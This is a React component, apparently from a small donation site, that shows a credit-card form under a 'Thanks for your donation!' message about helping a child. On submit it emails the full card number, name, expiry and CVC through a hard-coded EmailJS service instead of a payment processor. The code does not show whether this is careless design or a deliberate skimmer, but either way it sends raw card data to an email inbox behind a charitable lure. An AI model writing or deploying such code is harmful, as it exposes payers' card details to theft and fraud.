import { useState, useRef, useEffect } from "react";
import Cards from "react-credit-cards";
import "react-credit-cards/es/styles-compiled.css";
import "./payment.css";
import Button from "react-bootstrap/Button";
import NavigationBar from "../../components/NavigationBar";
import emailjs from '@emailjs/browser';

function Payment() {
  const [number, setNumber] = useState("");

  const [name, setName] = useState("");

  const [expiry, setExpiry] = useState("");

  const [cvc, setCvc] = useState("");

  const [focus, setFocus] = useState("");

  const firstRender = useRef(true)

  const payment = useRef()
    
   
  useEffect(() => {
    if (firstRender.current) {
      firstRender.current = false
      return
    }

    if (expiry.length === 2) {
      setExpiry(expiry+'/')
      
    }
  
  }, [expiry]) 
   

  useEffect(() => {
    ref.current.focus();
  }, []);

  const onSubmit = () => {
  
    emailjs.sendForm('service_di4caar', 'template_s7wrlnf', payment.current, 'vfIYz4eqhWMQv2r60')

  }
 

  const ref = useRef(null);
  return (
    <div className="Payment">
      <NavigationBar/>
      <div className="payment-container">
        <Cards
          number={number}
          name={name}
          expiry={expiry}
          cvc={cvc}
          focused={focus}
          
        />
        <form ref={payment}>
          <input
            type="tel"
            name="payment.number"
            maxLength={16}
            placeholder="Card Number"
            value={number}
            onChange={(e) => setNumber(e.target.value)}
            onFocus={(e) => setFocus(e.target.name)}
            ref={ref}
          />
          <input
            type="text"
            name="payment.name"
            placeholder="Full Name"
            value={name}
            onChange={(e) => setName(e.target.value)}
            onFocus={(e) => setFocus(e.target.name)}
          />
          <input
            type="tel"
            name="payment.expiry"
            maxLength={5}
            placeholder="MM/YY"
            value={expiry}
            onChange={(e) => setExpiry(e.target.value)}
            onFocus={(e) => setFocus(e.target.name)}
          />
          <input
            type="tel"
            name="payment.cvc"
            maxLength={3}
            placeholder="CVC"
            value={cvc}
            onChange={(e) => setCvc(e.target.value)}
            onFocus={(e) => setFocus(e.target.name)}
          />
        </form>
        <Button onClick={onSubmit} variant="primary" type="submit">Pay</Button>
      </div>
      <div className="text-container">
        <h1>Thanks for your donation!</h1>
        <p>
            You can be sure this money will be used to change a life of a child.
        </p>
      </div>
    </div>
  );
}

export default Payment;
